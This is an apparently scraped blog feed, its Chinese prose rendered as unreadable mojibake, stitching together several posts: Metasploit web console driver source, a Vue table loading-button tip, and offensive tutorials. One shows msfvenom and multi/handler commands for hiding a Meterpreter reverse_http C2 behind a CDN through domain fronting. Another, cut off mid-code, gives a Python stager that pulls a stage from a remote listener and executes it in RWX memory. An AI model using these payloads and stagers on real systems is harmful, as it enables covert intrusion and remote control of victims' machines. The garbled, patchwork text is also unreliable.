28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 # -*- coding: binary -*- require \u0026#39;rex/proto/http\u0026#39; require \u0026#39;msf/core\u0026#39; require \u0026#39;msf/base\u0026#39; require \u0026#39;msf/ui\u0026#39; module Msf module Ui module Web require \u0026#39;rex/ui/text/bidirectional_pipe\u0026#39; require \u0026#39;msf/ui/web/console\u0026#39; ### # # This class implements a user interface driver on a web interface. # ### class Driver \u0026lt; Msf::Ui::Driver attr_accessor :framework # :nodoc: attr_accessor :consoles # :nodoc: attr_accessor :sessions # :nodoc: attr_accessor :last_console # :nodoc: ConfigCore = \u0026#34;framework/core\u0026#34; ConfigGroup = \u0026#34;framework/ui/web\u0026#34; # # Initializes a web driver instance and prepares it for listening to HTTP # requests. The constructor takes a hash of options that can control how # the web server will operate. # def initialize(opts = {}) # Call the parent super() # Set the passed options hash for referencing later on. self.opts = opts self.consoles = {} self.sessions = {} if(opts[:framework]) self.framework = opts[:framework] else # Initialize configuration Msf::Config.init # Initialize logging initialize_logging # Initialize attributes self.framework = Msf::Simple::Framework.create end # Initialize the console count self.last_console = 0 end def create_console(opts={}) # Destroy any unused consoles clean_consoles console = WebConsole.new(self.framework, self.last_console, opts) self.last_console += 1 self.consoles[console.console_id.to_s] = console console.console_id.to_s end def destroy_console(cid) con = self.consoles[cid] if(con) con.shutdown self.consoles.delete(cid) end end def write_console(id, buf) self.consoles[id] ? self.consoles[id].write(buf) : nil end def read_console(id) self.consoles[id] ? self.consoles[id].read() : nil end def clean_consoles(timeout=300) self.consoles.each_pair do |id, con| if (con.last_access + timeout \u0026lt; Time.now) con.shutdown self.consoles.delete(id) end end end def write_session(id, buf) ses = self.framework.sessions[id] return if not ses return if not ses.user_input ses.user_input.put(buf) end def read_session(id) ses = self.framework.sessions[id] return if not ses return if not ses.user_output ses.user_output.read_subscriber(\u0026#39;session_reader\u0026#39;) end # Detach the session from an existing input/output pair def connect_session(id) # Ignore invalid sessions ses = self.framework.sessions[id] return if not ses # Has this session already been detached? if (ses.user_output) return if ses.user_output.has_subscriber?(\u0026#39;session_reader\u0026#39;) end # Create a new pipe spipe = WebConsole::WebConsolePipe.new spipe.input = spipe.pipe_input # Create a read subscriber spipe.create_subscriber(\u0026#39;session_reader\u0026#39;) framework.threads.spawn(\u0026#34;ConnectSessionInteraction\u0026#34;, false) do ses.interact(spipe.input, spipe) end end def sessions self.framework.sessions end # # Stub # def run true end protected attr_accessor :opts # :nodoc: # # Initializes logging for the web interface # def initialize_logging level = (opts[\u0026#39;LogLevel\u0026#39;] || 0).to_i Msf::Logging.enable_log_source(LogSource, level) end end # Add DriverFactory, makes it possible to get the same Driver instance class DriverFactory include Singleton def initialize() @drivers = Hash.new @mutex = Mutex.new end def get_or_create(opts={}, name=\u0026#39;default\u0026#39;) if not @drivers.key?(name) @mutex.synchronize { if not @drivers.key?(name) @drivers[name] = Driver.new(opts) return @drivers[name] end } end return @drivers[name] end end end end end ","permalink":"https://www.hacktech.cn/post/msf-rpc-console-cannot-opera-same-session-on-same-time.html","summary":"\u003cp\u003eæ„Ÿè§‰å¯èƒ½æ˜¯éœ€è¦å¯¹ connect_session æ”¹åŠ¨ä¸€ä¸‹\u003c/p\u003e\n\u003cp\u003eåé¢æœ‰æ—¶é—´éªŒè¯ä¸€ä¸‹\u003c/p\u003e","title":"TODO ç¬”è®°ï¼šmsf rpc console ä¸èƒ½åŒæ—¶å¯¹ä¸€ä¸ªsessionè¿›è¡Œæ“ä½œ"},{"content":"å‰å‡ ç¯‡éƒ½æ˜¯è¯´äº†ä¸‹å¦‚ä½•é‡‡ç”¨ä¸åŒçš„è¯­è¨€å¼€å‘ reverse_tcp ç¬¬äºŒé˜¶æ®µï¼Œæ¥ä¸‹æ¥å°†æ…¢æ…¢åˆ†æ reverse_httpï¼Œè¿™ç¯‡æ–‡ç« å¹¶ä¸ä¼šå›´ç»• stagers è¿›è¡Œè®²è§£ï¼Œè¿™ç¯‡æ–‡ç« åªæ˜¯åŠåŸ‹ä¸Šæˆ‘ä¹‹å‰æŒ–çš„ä¸€ä¸ªå‘ï¼Œå…³äºåŸŸå‰ç½®æŠ€æœ¯å¦‚ä½•åœ¨ msf ä¸­è¿›è¡Œåº”ç”¨ã€‚\nåŸŸå‰ç½®æŠ€æœ¯ä»‹ç» åŸŸå‰ç½®æŠ€æœ¯ï¼ˆDomain-Frontingï¼‰é¡¾åæ€ä¹‰ï¼ŒæŠŠåŸŸåæ”¾åœ¨å‰é¢ï¼Œæµé‡çš„å‰é¢ï¼Œé‚£ä¹ˆæˆ‘ä»¬åº”è¯¥å¦‚ä½•åšåˆ°è¿™ä»¶äº‹æƒ…ï¼Œè¿™ä¸ªä¸€èˆ¬å°±æ˜¯åˆ©ç”¨å„å¤§ cdn æœåŠ¡äº†ã€‚\ncdn æŠ€æœ¯æˆ‘ä¸ç”¨åšè¿‡å¤šä»‹ç»ï¼Œç›¸ä¿¡å¤§å®¶ç»™è‡ªå·±çš„ç½‘ç«™ä¸Š cdn éƒ½ä¼šä¸Šï¼Œç®€ç•¥æ¥è¯´åŸç†çš„è¯ï¼Œåœ¨åŸŸåæ³¨å†Œå•†é‚£é‡ŒæŠŠ ns è®°å½•ï¼Œä¹Ÿå°±æ˜¯ dns è§£ææœåŠ¡å™¨æŒ‡å‘åˆ°ä½ é€‰æ‹©çš„ cdn æœåŠ¡å•†ï¼Œç„¶å cdn å°±å¯ä»¥æ¥ç®¡ä½ çš„åŸŸåè§£æäº†ï¼Œé€šè¿‡ä¸åŒçš„ç¼“å­˜åˆ†æµç­–ç•¥ï¼ŒæŠŠæµé‡ç»è¿‡ä»–çš„æœåŠ¡å™¨åå†è½¬å‘ç»™æˆ‘ä»¬è‡ªå·±ï¼Œä¹Ÿå°±æ˜¯ cdn åé¢çš„çœŸå®ipæˆ‘ä»¬æ˜¯ä¸å®¹æ˜“æ‰¾åˆ°çš„ã€‚\né‚£ä¹ˆåº”ç”¨åˆ° C2 ä¸Šï¼Œæˆ‘ä»¬ C2 æœåŠ¡å™¨ä¹Ÿå¯ä»¥æŒ‚åœ¨ cdn åé¢ï¼Œæµé‡é€šè¿‡ cdn è½¬å‘å›æ¥ã€‚\nå…·ä½“æ›´ä¸ºè¯¦ç»†çš„ä»‹ç»å¯ä»¥å‚è§ çº¢é˜Ÿè¡ŒåŠ¨ä¹‹é±¼å‰æ”»å‡»-å€¾æ—‹\nåŸºç¡€é…ç½® é¦–å…ˆä¸ç®¡æ€æ ·ä½ éœ€è¦æœ‰ä¸€ä¸ªæœåŠ¡å™¨ï¼Œä»¥åŠä¸€ä¸ªåŠ äº† cdn çš„åŸŸåæ‰§è¡Œä½ æœåŠ¡å™¨\nè¿™é‡Œæˆ‘å‡è®¾æˆ‘ä»¬æŒæœ‰çš„åŸŸåä¸º test.akkuman.comï¼ŒåŸŸåé…å¥½ cdn æŒ‡å‘çš„æœåŠ¡å™¨æ˜¯ 1.1.1.1\nè¿™é‡Œä½ æ˜¯æŠŠæœåŠ¡å™¨æ¶åœ¨ msf ä¸Šé¢è¿˜æ˜¯å†…ç½‘ç©¿é€æ‰“é€šç«¯å£ï¼Œè¿™ä¸ªçœ‹è‡ªå·±å–œå¥½\næˆ‘è¿™é‡Œæ˜¯ msf ä½äºå…¶ä»–åœ°æ–¹ 2.2.2.2ï¼Œç„¶å 2.2.2.2 çš„ 5555 ç«¯å£é€šè¿‡ frp æ˜ å°„åˆ° 1.1.1.1 çš„ 80 ç«¯å£ä¸Šã€‚\n5555 ç«¯å£æ˜¯æˆ‘ä»¬å¾…ä¼š msf ç›‘å¬çš„ç«¯å£ï¼Œ80 ç«¯å£æ˜¯å› ä¸ºè®¿é—®åŸŸåï¼Œhttp åè®®ï¼Œè®¿é—®80ã€‚\nå› ä¸ºè¿™äº›æµé‡ä¼šé€šè¿‡ cdn å…ˆè½¬å‘åˆ°æˆ‘ä»¬ä¸»æœºä¸Šçš„ 80 ç«¯å£ï¼Œç„¶å 80 ç«¯å£ä¸Šçš„æµé‡ä¼šé€šè¿‡ frp å¤„ç†åé€åˆ°æˆ‘ä»¬æœ¬æœºç›‘å¬çš„ 5555 ç«¯å£ä¸Šã€‚\nç”Ÿæˆ msf payload åŸºç¡€ä¸€äº›é…ç½®åšå¥½ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥ç”Ÿæˆ payload äº†ã€‚\né¦–å…ˆæˆ‘ä»¬éœ€è¦å¾—åˆ°ä¸€ä¸ª cdn çš„ ipï¼Œå› ä¸º cdn æ˜¯ä¾é  http header ä¸­çš„ Host å¤´è¿›è¡Œæµé‡è½¬å‘çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ ping ä¸€ä¸‹æˆ‘ä»¬åŠ äº† cdn çš„åŸŸåå³å¯è·å¾—ä¸€ä¸ª ipï¼Œè¿™é‡Œæˆ‘æ˜¯ç”¨çš„ cloudflareï¼Œè·å¾—çš„ä¸€ä¸ª ip ä¸º 172.67.207.124\n1 msfvenom -p windows/meterpreter/reverse_http LHOST=172.67.207.124 LPORT=80 HttpHostHeader=test.akkuman.com -f exe -o ~/payload.exe è¿™é‡Œ LHOST ä¸ºæˆ‘ä»¬è·å–çš„ cdn ipï¼Œå› ä¸ºæ˜¯ http åè®®çš„ payloadï¼Œè®¿é—®åŸŸåæ˜¯è®¿é—® 80 ç«¯å£ï¼ŒLPORT æˆ‘ä»¬è®¾ç½®ä¸º 80\nHttpHostHeader é€‰é¡¹ä¸ºè¿™ä¸ªç”Ÿæˆçš„ payload ä½¿ç”¨ http åè®®å›è¿åˆ° cdn ip æ—¶ http header æ‰€ä½¿ç”¨çš„ Host å¤´ï¼Œè¿˜è®°å¾—æˆ‘ä»¬åˆšæ‰è¯´çš„ cdn å¦‚ä½•è¯†åˆ«åŸŸåè¿›è¡Œæµé‡è½¬å‘å—ï¼Œè¿™ä¸ªå°±ä¸»è¦æ˜¯ä¸ºäº† cdn èƒ½å¤ŸæŠŠæµé‡è½¬å›åˆ°æˆ‘ä»¬è‡ªå·±çš„æœåŠ¡å™¨\nåˆ›å»ºç›‘å¬å™¨ msf åœ¨ç›‘å¬ä¸­æœ‰ä¸€äº›é…ç½®éœ€è¦è¯´æ˜ä¸€ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 msf5 \u0026gt; use exploit/multi/handler msf5 exploit(multi/handler) \u0026gt; set payload windows/meterpreter/reverse_http payload =\u0026gt; windows/meterpreter/reverse_http msf5 exploit(multi/handler) \u0026gt; set lhost 172.67.207.124 lhost =\u0026gt; 172.67.207.124 msf5 exploit(multi/handler) \u0026gt; set lport 80 lport =\u0026gt; 80 msf5 exploit(multi/handler) \u0026gt; set HttpHostHeader test.akkuman.com HttpHostHeader =\u0026gt; test.akkuman.com msf5 exploit(multi/handler) \u0026gt; set OverrideRequestHost true OverrideRequestHost =\u0026gt; true msf5 exploit(multi/handler) \u0026gt; set ReverseListenerBindAddress 127.0.0.1 ReverseListenerBindAddress =\u0026gt; 127.0.0.1 msf5 exploit(multi/handler) \u0026gt; set ReverseListenerBindPort 5555 ReverseListenerBindPort =\u0026gt; 5555 msf5 exploit(multi/handler) \u0026gt; run é¦–å…ˆ lhost ä¸ºç»™ payload è¿”å›ç¬¬äºŒé˜¶æ®µè½½è·æ—¶å¡«å…¥çš„ ip åœ°å€ï¼Œå³ç¬¬äºŒé˜¶æ®µä¼šå›è¿åˆ°è¿™ä¸ª ip\nlport ä¸ºç»™ payload è¿”å›ç¬¬äºŒé˜¶æ®µè½½è·æ—¶å¡«å…¥çš„ portï¼Œå³ç¬¬äºŒé˜¶æ®µä¼šå›è¿åˆ°è¿™ä¸ªç«¯å£\nHttpHostHeader å‰é¢è¯´è¿‡ï¼Œæ˜¯ payload å›è¿åˆ°è¿™ä¸ª ip å’Œ port æ—¶åœ¨ http header ä¸­å¡«å…¥çš„ Host å¤´\nOverrideRequestHost è¿™ä¸ªé€‰é¡¹éœ€è¦è®¾ç½®ä¸º trueï¼Œä¸»è¦æ˜¯å› ä¸º msf çš„å†å²åŸå› ï¼Œmsf é»˜è®¤æ˜¯ä½¿ç”¨ä¼ å…¥è¯·æ±‚ http header ä¸­çš„ Host å­—æ®µæ¥ä½œä¸ºç¬¬äºŒé˜¶æ®µçš„é…ç½®ï¼Œä¹Ÿå°±æ˜¯ç¬¬äºŒé˜¶æ®µä¼šé‡‡ç”¨å»ºç«‹è¿æ¥æ—¶ä¼ å…¥è¯·æ±‚çš„ Hostï¼Œè¿™ç§é»˜è®¤è¡Œä¸ºåœ¨å¤§å¤šæ•°è¯·æ±‚ä¸‹æ²¡é—®é¢˜ï¼Œå…·ä½“å¯ä»¥è‡ªè¡Œæµ‹è¯•ï¼Œå…·ä½“æ˜¯éœ€è¦ cdn å›è¿åˆ°æˆ‘ä»¬çœŸå® ip æ—¶ä¼ é€’çš„åŸŸåæ˜¯æˆ‘ä»¬æƒ³è¦çš„ï¼Œè¿™ä¸ªå‚æ•°è®¾ç½®ä¸º true å¯ä»¥è®© msf å¿½ç•¥ä¼ å…¥è¯·æ±‚çš„ Host å¤´ï¼Œè€Œä½¿ç”¨æˆ‘ä»¬åœ¨ HttpHostHeader ä¸­è®¾ç½®çš„\nReverseListenerBindAddress å’Œ ReverseListenerBindPort å‚æ•°ä¸»è¦æ˜¯å› ä¸ºæˆ‘çš„ç¯å¢ƒé—®é¢˜ï¼Œæˆ‘æ˜¯é€šè¿‡ frp æŠŠ 1.1.1.1:80 ç©¿é€åˆ°äº†æœ¬åœ° (2.2.2.2) çš„ 127.0.0.1:5555ï¼Œå¦‚æœä½ çš„ msf ç›´æ¥åœ¨ 1.1.1.1 ä¸Šï¼Œé‚£ä¹ˆ duck ä¸å¿…è¿™ä¹ˆåšï¼Œç›´æ¥ç›‘å¬ 80 å°±å¥½\nReverseListenerBindAddress è¿™ä¸ªå‚æ•°å…¶å®è®¾ç½®ä¸è®¾ç½®éƒ½æ²¡å…³ç³»ï¼Œä½†æ˜¯ä¸è®¾ç½®çš„è¯ä¼šæœ‰ä¸ªå°æŠ¥é”™ï¼Œ\n1 [-] Handler failed to bind to 172.67.207.124:80 è¿™æ˜¯å› ä¸º handler æ— æ³•å°† cdn çš„ ip ç»‘å®šåˆ°LHOSTï¼Œå› ä¸ºè¿™ä¸ª ip åœ¨æˆ‘ä»¬æœåŠ¡å™¨ä¸Šä¸å­˜åœ¨ï¼Œç»‘å®šå¤±è´¥å°±ä¼šæç¤ºè¿™ä¸ªï¼Œç„¶åç»§ç»­ç»‘å®š 0.0.0.0ã€‚å¦‚æœæƒ³è¦åœ¨ç•Œé¢ä¸Šä¸æ˜¾ç¤ºè¿™ä¸ªé”™è¯¯ï¼Œéœ€è¦è®¾ç½® ReverseListenerBindAddress ä¸º 0.0.0.0 æˆ–è€… 127.0.0.1 ä¹‹ç±»çš„\nå¯ä»¥çœ‹åˆ°ï¼Œå½“æˆ‘ä»¬ä¸è®¾ç½® ReverseListenerBindAddress å’Œ ReverseListenerBindPort æ—¶ä¼šå‡ºç°ä¸Šé¢çš„æŠ¥é”™ Handler failed to bind to 172.67.207.124:80\nä¹Ÿå°±æ˜¯ handler åœ¨æœ¬åœ°ä¸Šæ˜¯å¸Œæœ›ç›‘å¬ 80 çš„ï¼Œè€Œ 1.1.1.1:80 ä¸Šé¢çš„æµé‡æ˜¯è½¬å‘åˆ°æˆ‘ä»¬æœåŠ¡å™¨ (2.2.2.2) æœ¬æœºçš„ 5555 ç«¯å£ä¸Šçš„ã€‚\næ‰€ä»¥æˆ‘ä»¬çš„ç›‘å¬ç¨‹åºå®é™…ä¸Šéœ€è¦ç›‘å¬åœ¨ 5555 ç«¯å£ä¸Šï¼Œæ‰€ä»¥éœ€è¦è®¾ç½® ReverseListenerBindPort å‚æ•°\nä¸Šé¢çš„ lhost å’Œ lport å…¶å®ä¸»è¦æ˜¯ä¸ºäº†ç¬¬äºŒé˜¶æ®µå›é€æœåŠ¡çš„ã€‚\nå®é™…æ•ˆæœ 1 paylaod.exe \u0026lt;-\u0026gt; cdnip:80(Host: test.akkuman.com) \u0026lt;-\u0026gt; 1.1.1.1:80 \u0026lt;-\u0026gt; frp[1.1.1.1:7000\u0026lt;-\u0026gt;2.2.2.2:éšæœºç«¯å£] \u0026lt;-\u0026gt; 127.0.0.1:5555 å¯ä»¥çœ‹åˆ°ä¸ç®¡æ˜¯è¯·æ±‚ç¬¬äºŒé˜¶æ®µè¿˜æ˜¯åç»­çš„å¿ƒè·³åŒ…ï¼Œéƒ½æ˜¯æœ‰å¸¦ä¸Š Host å¤´ï¼Œæµç» cdn æœåŠ¡å™¨çš„ï¼Œè¿™æ ·æˆ‘ä»¬å°±è¾¾åˆ°äº†éšè—è‡ªèº«çš„æ•ˆæœ\né‚£ä¹ˆ msf ä¼šè¯è¿™è¾¹å‘¢\nå¯ä»¥çœ‹åˆ°ï¼Œä¹Ÿæ˜¯å¯ä»¥æ­£å¸¸ä½¿ç”¨çš„\n","permalink":"https://www.hacktech.cn/post/msf-stagers-develop-4.html","summary":"\u003cp\u003eå‰å‡ ç¯‡éƒ½æ˜¯è¯´äº†ä¸‹å¦‚ä½•é‡‡ç”¨ä¸åŒçš„è¯­è¨€å¼€å‘ reverse_tcp ç¬¬äºŒé˜¶æ®µï¼Œæ¥ä¸‹æ¥å°†æ…¢æ…¢åˆ†æ reverse_httpï¼Œè¿™ç¯‡æ–‡ç« å¹¶ä¸ä¼šå›´ç»• stagers è¿›è¡Œè®²è§£ï¼Œè¿™ç¯‡æ–‡ç« åªæ˜¯åŠåŸ‹ä¸Šæˆ‘ä¹‹å‰æŒ–çš„ä¸€ä¸ªå‘ï¼Œå…³äºåŸŸå‰ç½®æŠ€æœ¯å¦‚ä½•åœ¨ msf ä¸­è¿›è¡Œåº”ç”¨ã€‚\u003c/p\u003e","title":"msf stagerså¼€å‘ä¸å®Œå…¨æŒ‡åŒ—(å››): msf ä¸­ä½¿ç”¨åŸŸå‰ç½®æŠ€æœ¯éšè—æµé‡"},{"content":"éœ€æ±‚ï¼šè¡¨æ ¼æ¯ä¸€åˆ—æœ‰ä¸€ä¸ªæŒ‰é’®å­—æ®µï¼Œç‚¹å‡»åéœ€è¦loading\næŒ‰ç…§æ™®é€šçš„åœ¨ Array å¯¹è±¡ä¸ŠåŠ å±æ€§ï¼Œç›‘å¬ä¸åˆ°å˜åŒ–ï¼Œéœ€è¦ä½¿ç”¨ this.$set\næ¯”å¦‚è¿™ä¸ªæ ·å­è®¾ç½®\n1 2 3 4 5 6 7 8 9 10 getCoreLoots().then(response =\u0026gt; { this.transitFileList = response.data.data this.transitFileList = this.transitFileList.map(item =\u0026gt; { // æ·»åŠ ä¸Šä¼ æŒ‰é’®loading item.uploadLoading = false return item }) console.log(this.transitFileList) this.transitListLoading = false }) è¿™æ ·å­å‡ºæ¥çš„ç»“æœæ˜¯è¿™æ ·\nå±æ€§è®¾ç½®åˆ°äº† __ob__ å¤–é¢ï¼Œvueç›‘å¬ä¸åˆ°å˜åŒ–ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¿›è¡Œæ”¹å˜ådomä¸ä¼šæ›´æ–°\nä¸»è¦çš„åŸå› æ˜¯ï¼šå½“ä½ æŠŠä¸€ä¸ªæ™®é€šçš„ JavaScript å¯¹è±¡ä¼ å…¥ Vue å®ä¾‹ä½œä¸º data é€‰é¡¹ï¼ŒVue å°†éå†æ­¤å¯¹è±¡æ‰€æœ‰çš„ propertyï¼Œå¹¶ä½¿ç”¨ Object.defineProperty æŠŠè¿™äº› property å…¨éƒ¨è½¬ä¸º getter/setterã€‚è¿™äº› getter/setter å¯¹ç”¨æˆ·æ¥è¯´æ˜¯ä¸å¯è§çš„ï¼Œä½†æ˜¯åœ¨å†…éƒ¨å®ƒä»¬è®© Vue èƒ½å¤Ÿè¿½è¸ªä¾èµ–ï¼Œåœ¨ property è¢«è®¿é—®å’Œä¿®æ”¹æ—¶é€šçŸ¥å˜æ›´ã€‚Vue æ— æ³•æ£€æµ‹ property çš„æ·»åŠ æˆ–ç§»é™¤ã€‚ç”±äº Vue ä¼šåœ¨åˆå§‹åŒ–å®ä¾‹æ—¶å¯¹ property æ‰§è¡Œ getter/setter è½¬åŒ–ï¼Œæ‰€ä»¥ property å¿…é¡»åœ¨ data å¯¹è±¡ä¸Šå­˜åœ¨æ‰èƒ½è®© Vue å°†å®ƒè½¬æ¢ä¸ºå“åº”å¼çš„ã€‚\nçŸ¥é“äº†åŸå› ä¹‹åæˆ‘ä»¬å¯ä»¥åšä¸€ä¸‹ç•¥å¾®çš„æ”¹é€ \n1 2 3 4 5 6 7 8 9 10 getCoreLoots().then(response =\u0026gt; { this.transitFileList = response.data.data this.transitFileList = response.data.data.map(item =\u0026gt; { // æ·»åŠ ä¸Šä¼ æŒ‰é’®loading item.uploadLoading = false return item }) console.log(this.transitFileList) this.transitListLoading = false }) ç°åœ¨å¯ä»¥çœ‹åˆ°åœ¨ __ob__ é‡Œé¢äº†ã€‚\nåŒæ ·ï¼Œå¦‚æœä½ æœ‰æ›´å¤šçš„éœ€æ±‚å¯ä»¥æŒ‰ç…§å®˜æ–¹æ–‡æ¡£ä¸­çš„ä½¿ç”¨ set æ¥è¿›è¡Œè®¾ç½®\nä¾‹å¦‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \u0026lt;el-table-columnlabel=\u0026#34;æ“ä½œ\u0026#34; width=\u0026#34;145\u0026#34;\u0026gt; \u0026lt;template slot-scope=\u0026#34;scope\u0026#34;\u0026gt; \u0026lt;el-button type=\u0026#34;text\u0026#34; :loading=\u0026#34;scope.row.uploadLoading\u0026#34; size=\u0026#34;mini\u0026#34; @click=\u0026#34;handleClickUploadTransitFileToTarget(scope)\u0026#34;\u0026gt;ä¸Šä¼ åˆ°ç›®æ ‡\u0026lt;/el-button\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;/el-table-column\u0026gt; ... getTransitFileList() { getCoreLoots().then(response =\u0026gt; { this.transitFileList = response.data.data this.transitFileList = this.transitFileList.map(item =\u0026gt; { // æ·»åŠ ä¸Šä¼ æŒ‰é’®loading this.$set(item, \u0026#39;uploadLoading\u0026#39;, false) return item }) }) }, handleClickUploadTransitFileToTarget(scope) { this.$set(scope.row, \u0026#39;uploadLoading\u0026#39;, true) uploadFileToTarget().then(response =\u0026gt; { showMsg(this, `${scope.row.name} ä¸Šä¼ æˆåŠŸ`) this.$set(scope.row, \u0026#39;uploadLoading\u0026#39;, false) }) } ","permalink":"https://www.hacktech.cn/post/elementui-button-loading-in-table.html","summary":"\u003cp\u003eéœ€æ±‚ï¼šè¡¨æ ¼æ¯ä¸€åˆ—æœ‰ä¸€ä¸ªæŒ‰é’®å­—æ®µï¼Œç‚¹å‡»åéœ€è¦loading\u003c/p\u003e","title":"elementui è¡¨æ ¼ä¸­å¸¦æœ‰æŒ‰é’®çš„loadingè§£å†³æ–¹æ¡ˆ"},{"content":"é‡‡ç”¨ Python å¼€å‘stagers ä¹‹å‰çš„æ–‡ç« ä¸­æˆ‘ä»¬è®²åˆ°äº†å¦‚ä½•ä½¿ç”¨ c ä»¥åŠ golang å¼€å‘ stagersï¼Œè¿™ç¯‡æ–‡ç« æˆ‘å°†ç€çœ¼äº pythonï¼Œæ¢è®¨ä¸€ä¸‹å¦‚ä½•ä½¿ç”¨ python å®ç°ç›¸åŒçš„åŠŸèƒ½ï¼Œä¹Ÿå°±æ˜¯msfçš„ stagersã€‚\nç¯å¢ƒ OS: Windows 10 Python: Python 3.7.7 (tags/v3.7.7:d7c567b08f, Mar 10 2020, 10:41:24) [MSC v.1900 64 bit (AMD64)] on win32 å‰æƒ…æè¦ è¿™ç¯‡æ–‡ç« å°†æ˜¯ windows reverse_tcp ç›¸å…³çš„æœ€åä¸€èŠ‚ï¼Œè®©æˆ‘ä»¬å›å¿†ä¸€ä¸‹ä¹‹å‰å†™çš„æ–‡ç« ä¸­çš„æµç¨‹åŸç†ï¼ŒæŠŠ socket æ–‡ä»¶æè¿°ç¬¦æ”¾å…¥ edi æ˜¯ä¸ºäº†ä¼ é€’ç»™åé¢çš„ stagesï¼Œè®© stages èƒ½å¤Ÿå¤ç”¨è¿™ä¸ªè¿æ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬æœ‰äº† mov edi, socketfd è¿™ä¸€æ­¥ã€‚æˆ‘ä»¬è¿˜éœ€è¦å–åˆ°tcpåŒ…çš„å‰å››ä¸ªå­—èŠ‚ï¼Œè¿™å››ä¸ªå­—èŠ‚æ˜¯ä»£è¡¨ç€åç»­ stages payload çš„é•¿åº¦å¤§å°ï¼Œè·å–åˆ°è¿™ä¸ªå¤§å°åï¼Œæˆ‘ä»¬éœ€è¦è¯»å–å‡ºæŒ‡å®šå¤§å°çš„ tcp åŒ…ï¼Œç„¶åå°±æ˜¯æŠŠå®ƒå½“ä½œ shellcode çœ‹å¾…ï¼Œåˆ†é…å¯è¯»å¯å†™å¯æ‰§è¡Œå†…å­˜ï¼Œç„¶åå¡è¿›å»å¼€å§‹è·‘ã€‚\nå¤§è‡´ä¸Šæµç¨‹ç†æ¸…æ¥šäº†ï¼Œæˆ‘ä»¬å¼€å§‹ç”¨ Python ä»£ç è¿›è¡Œå®ç°\nå®ç°ç»†èŠ‚ åˆ›å»º tcp è¿æ¥ 1 2 3 address = (\u0026#39;192.168.174.136\u0026#39;, 5555) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect(address) åˆ›å»º tcp è¿æ¥æ²¡æœ‰ä»€ä¹ˆå¥½è¯´çš„ï¼Œä¸è¿‡è¿™é‡Œè¿˜æ˜¯éœ€è¦æ³¨æ„çš„ç‚¹æ˜¯æŠŠä½ çš„ payload ä¸ python å¯¹åº”èµ·æ¥ï¼Œæ¯”å¦‚32ä½payload ä½¿ç”¨ 32ä½ pythonï¼Œè¿™ç‚¹æ˜¯æ¯”è¾ƒé‡è¦çš„\nè·å–stages 1 2 3 4 # è·å–åç»­payloadå¤§å° payload_size = struct.unpack(\u0026#34;\u0026lt;I\u0026#34;, bytearray(s.recv(4)))[0] # è®¾ç½®flagæ¥æ”¶å…¨éƒ¨æ•°æ® payload = s.recv(payload_size, socket.MSG_WAITALL) è¿™é‡Œæ˜¯è¯»å–äº†å¤´å››ä¸ª byte ä½œä¸ºåç»­çš„ stages æ¥æ”¶é•¿åº¦ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„ç‚¹æ˜¯ socket.MSG_WAITALLï¼Œè¿™ä¸ª flag è¡¨ç¤ºä» socket è¿æ¥è¯»å–æŒ‡å®šé•¿åº¦çš„æ•°æ®åŒ…ä¸ºæ­¢ï¼Œä¸ç„¶å¯èƒ½é€ æˆ recv ä¸å®Œå…¨çš„æƒ…å†µï¼Œrecv é»˜è®¤æ˜¯æœ‰é•¿åº¦é™åˆ¶çš„ï¼Œæˆ–è€…è‡ªå·±ç”¨ for æ¥å®ç°ä¹Ÿå¯ä»¥ã€‚\nmov edi, socketfd æ¥ä¸‹æ¥å°±æ˜¯æŠŠ socket æ–‡ä»¶æè¿°ç¬¦æ”¾åˆ° edi é‡Œé¢å»äº†\n1 2 3 4 5 6 7 8 # socket æ–‡ä»¶æè¿°ç¬¦ï¼Œä¸ºäº†ediè°ƒç”¨ï¼ŒåŸç†è¯·æŸ¥çœ‹ https://akkuman.cnblogs.com/p/12859091.html socket_fd = struct.pack(\u0026#39;\u0026lt;I\u0026#39;, s.fileno()) # mov edi, socket_fd operation = b\u0026#39;\\xbf\u0026#39; + socket_fd # ç»„è£…å®Œæ•´çš„payload payload_with_edicall = operation + payload socket å¯¹è±¡æä¾›ä¸€ä¸ª fileno æ–¹æ³•æ¥ä¾›æˆ‘ä»¬è·å–åˆ° socket çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œè·å–åˆ°ä¹‹åæˆ‘ä»¬ä½¿ç”¨ struct çš„ pack æ–¹æ³•ç»™å®ƒæŒ‰ç…§å°ç«¯åšæˆä¸€ä¸ª4 byteçš„ï¼Œæ„é€ å‡º mov edi, socketfd å¯¹åº”çš„æœºå™¨ç ï¼Œç„¶åå’Œæˆ‘ä»¬ä¹‹å‰è·å–åˆ°çš„ stages è¿›è¡Œæ‹¼æ¥ç»„è£…æˆä¸€ä¸ªå®Œæ•´çš„ payload\næ‰§è¡Œ stages æ¥ä¸‹æ¥å°±æ˜¯åƒè·‘ shellcode ä¸€æ ·çš„æ´»å„¿äº†\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 shellcode = bytearray(payload_with_edicall) # è®¾ç½®VirtualAllocè¿”å›ç±»å‹ä¸ºctypes.c_uint64 ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64 # ç”³è¯·å†…å­˜ ptr = ctypes.windll.kernel32.VirtualAlloc( ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40) ) # æ”¾å…¥shellcode buf = (ctypes.c_char * 